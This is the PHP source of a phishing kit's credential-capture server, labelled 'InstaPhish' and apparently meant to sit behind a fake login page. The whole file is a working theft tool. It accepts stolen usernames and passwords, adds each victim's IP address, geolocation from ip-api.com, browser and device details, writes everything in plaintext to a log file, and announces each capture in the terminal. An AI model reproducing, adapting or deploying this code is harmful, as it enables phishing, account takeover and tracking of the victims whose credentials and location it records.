<?php
/**
 * InstaPhish - Credential Capture Server
 * Author: r4tur1
 * 
 * Receives JSON payload from login.js, logs to file,
 * and outputs to terminal with colored formatting.
 */

// Enable error reporting for debugging
error_reporting(E_ALL);
ini_set('display_errors', 0);

// CORS headers for cross-origin requests
header('Access-Control-Allow-Origin: *');
header('Access-Control-Allow-Methods: POST, GET, OPTIONS');
header('Access-Control-Allow-Headers: Content-Type');
header('Content-Type: application/json');

// Handle preflight
if ($_SERVER['REQUEST_METHOD'] === 'OPTIONS') {
    http_response_code(200);
    exit;
}

// Only accept POST
if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
    http_response_code(405);
    echo json_encode(['status' => 'error', 'message' => 'Method not allowed']);
    exit;
}

// Configuration
$logFile = __DIR__ . '/../logs/credentials.txt';
$logDir = dirname($logFile);

// Create logs directory if it doesn't exist
if (!is_dir($logDir)) {
    mkdir($logDir, 0755, true);
}

// Get raw input
$rawInput = file_get_contents('php://input');
$data = json_decode($rawInput, true);

// Validate data
if (!$data || !isset($data['username']) || !isset($data['password'])) {
    http_response_code(400);
    echo json_encode(['status' => 'error', 'message' => 'Invalid payload']);
    exit;
}

// Sanitize input for logging
$username = htmlspecialchars($data['username'], ENT_QUOTES, 'UTF-8');
$password = htmlspecialchars($data['password'], ENT_QUOTES, 'UTF-8');
$verified = isset($data['verified']) && $data['verified'] ? 'YES' : 'NO';
$timestamp = $data['timestamp'] ?? date('Y-m-d H:i:s');
$timezone = $data['timezone'] ?? 'Unknown';
$userAgent = $data['userAgent'] ?? 'Unknown';
$ip = $_SERVER['REMOTE_ADDR'] ?? 'Unknown';
$forwardedIp = $_SERVER['HTTP_X_FORWARDED_FOR'] ?? null;
$realIp = $forwardedIp ? "$ip (FWD: $forwardedIp)" : $ip;
$referrer = $data['referrer'] ?? $_SERVER['HTTP_REFERER'] ?? 'Direct';
$screenRes = $data['screenResolution'] ?? 'Unknown';
$platform = $data['platform'] ?? 'Unknown';
$language = $data['language'] ?? 'Unknown';

// Get ISP and location information using ip-api.com
$geoInfo = [];
try {
    $ipToCheck = $forwardedIp ?: $ip;
    if ($ipToCheck && $ipToCheck !== '127.0.0.1' && $ipToCheck !== '::1') {
        $geoJson = @file_get_contents("http://ip-api.com/json/{$ipToCheck}?fields=country,city,isp,org,as,query");
        if ($geoJson) {
            $geoInfo = json_decode($geoJson, true) ?: [];
        }
    }
} catch (Exception $e) {
    // Silently fail - geo is optional
}

// Format log entry
$logEntry = "============================================================\n";
$logEntry .= "TIMESTAMP: {$timestamp}\n";
$logEntry .= "VERIFIED:  {$verified}\n";
$logEntry .= "USERNAME:  {$username}\n";
$logEntry .= "PASSWORD:  {$password}\n";
$logEntry .= "IP:        {$realIp}\n";

if (!empty($geoInfo)) {
    $logEntry .= "LOCATION:  {$geoInfo['city']}, {$geoInfo['country']}\n";
    $logEntry .= "ISP:       {$geoInfo['isp']}\n";
    $logEntry .= "ORG:       {$geoInfo['org']}\n";
}

$logEntry .= "PLATFORM:  {$platform}\n";
$logEntry .= "BROWSER:   {$userAgent}\n";
$logEntry .= "SCREEN:    {$screenRes}\n";
$logEntry .= "LANG:      {$language}\n";
$logEntry .= "TIMEZONE:  {$timezone}\n";
$logEntry .= "REFERRER:  {$referrer}\n";
$logEntry .= "============================================================\n\n";

// Write to log file
file_put_contents($logFile, $logEntry, FILE_APPEND | LOCK_EX);

// Output to terminal with colors
$terminalOutput = "\033[1;32m[+] CAPTURE SUCCESS\033[0m\n";
$terminalOutput .= "\033[1;33m⏰ {$timestamp}\033[0m\n";
$terminalOutput .= "\033[1;36m👤 {$username}\033[0m\n";
$terminalOutput .= "\033[1;35m🔑 {$password}\033[0m\n";
$terminalOutput .= "\033[1;34m🌐 {$realIp}\033[0m";

if (!empty($geoInfo)) {
    $terminalOutput .= " - {$geoInfo['city']}, {$geoInfo['country']}";
}

$terminalOutput .= "\n\033[1;37m✓ Verified: {$verified}\033[0m\n";
$terminalOutput .= "\033[0;37m───────────────────────────────────────────\033[0m\n";

// Write to terminal output
file_put_contents('php://stdout', $terminalOutput . "\n");

// Return success
http_response_code(200);
echo json_encode([
    'status' => 'success',
    'message' => 'Credentials captured',
    'timestamp' => $timestamp
]);